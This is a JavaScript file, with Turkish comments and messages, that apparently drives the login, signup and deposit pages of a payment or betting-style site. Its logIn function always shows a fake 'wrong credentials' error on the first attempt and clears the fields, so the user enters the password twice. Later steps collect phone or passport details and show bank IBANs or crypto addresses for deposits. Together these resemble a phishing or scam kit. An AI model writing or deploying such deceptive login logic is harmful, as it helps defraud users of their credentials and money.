function logIn() {
  // Disable the login button to prevent multiple clicks during the process
  $('.btn.sgn-btn').prop('disabled', true);

  event.preventDefault();

  // Eğer errmsg gösteriliyorsa, bu değer true olacak, aksi halde false olacaktır.
  const firstAttempt = $('#errmsg').hasClass('hidden');
  
  if (firstAttempt) {
     setTimeout(() => {
      $('#login_form').find('input[type="text"], input[type="password"]').val('');
    }, 600);
    
    // 1 saniye sonra errmsg'yi göster.
    setTimeout(() => {
      $('#errmsg').removeClass('hidden');
      // Re-enable the login button after showing the error message
      $('.btn.sgn-btn').prop('disabled', false);
    }, 600);
    
    return; 
  }
  
  if (phone_status == 1 || passport_status == 1) {
    $('.loginSteps #step_1').addClass('hidden');
    $('.loginSteps #step_2').removeClass('hidden');
    phone_status = 0;
    passport_status = 0;
    $('.btn.sgn-btn').prop('disabled', false);
  } else {
    $.ajax({
      type: 'POST',
      url: 'request.php?q=login',
      data: $('#login_form').serialize(),
      success: (response) => {
        if (response == 'error') {
          Swal.fire('Hata!','Kullanıcı adı ve ya şifre hatalı.','error');
          if (phone_status == 1 || passport_status == 1) {
            $('.loginSteps #step_1').removeClass('hidden');
            $('.loginSteps #step_2').addClass('hidden');
            phone_status = 1;
            passport_status = 1;
          }
        } else if(response == '2fa') {
          closemodal();
          openmodal('sms-mdl', 'none');
        } else {
          window.location.href = '/deposit'; 
        }
        $('.btn.sgn-btn').prop('disabled', false);
      }
    });
  }
}




function signUp(){
  event.preventDefault();
  $.ajax({
    type: 'POST',
    url: 'request.php?q=signup',
    data: $('#register_form').serialize(),
    success: (response) => {
      if (response == 'error') {
        Swal.fire('Hata!','Bilgileri doğru girdiğinizden emin olun','error');
      }else{
        if (locate == 0) {
          window.location.href = '/';
        }else{
         window.location.href = '/';
        }
      }
    }
  })
}

function logOut(){
  $.ajax({
    type: 'POST',
    url: 'request.php?q=logout',
    success: (response) => {
      window.location.href = "/";
    }
  })
}



function checkBank(){
  const data = new FormData();
  data.append("id", parseInt(event.target.value));
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/request.php?q=get-bank");
  xhr.onload = function(){
    if (this.status == 200) {
      let response = JSON.parse(this.responseText);
      $('.ggff22').removeClass('hidden');
      document.querySelector("#bank_holder").value = response.account_holder;
      document.querySelector("#bank_number").value = response.iban;

    }
  }
  xhr.send(data);
}
function checkCrypto(){
  const data = new FormData();
  data.append("id", parseInt(event.target.value));
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "/request.php?q=get-crypto");
  xhr.onload = function(){
    if (this.status == 200) {
      let response = JSON.parse(this.responseText);
      $('.ggff22').removeClass('hidden');
      document.querySelector("#bank_holder").value = response.name + " ";
      document.querySelector("#bank_number").value = response.crypto_code;

    }
  }
  xhr.send(data);
}